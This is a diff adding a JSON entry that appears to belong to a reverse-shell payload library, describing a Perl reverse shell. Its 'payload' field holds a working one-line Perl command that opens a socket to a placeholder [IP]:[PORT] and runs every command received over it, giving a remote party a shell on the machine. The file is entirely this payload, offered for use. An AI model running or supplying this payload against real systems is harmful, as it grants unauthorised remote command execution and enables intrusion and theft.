@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "creates a reverse shell using perl",
+      "type": "reverse",
+      "exec": "perl"
+    },
+    "payload": "$c=new IO::Socket::INET(PeerAddr,\"[IP]:[PORT]\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"
+  }
+}
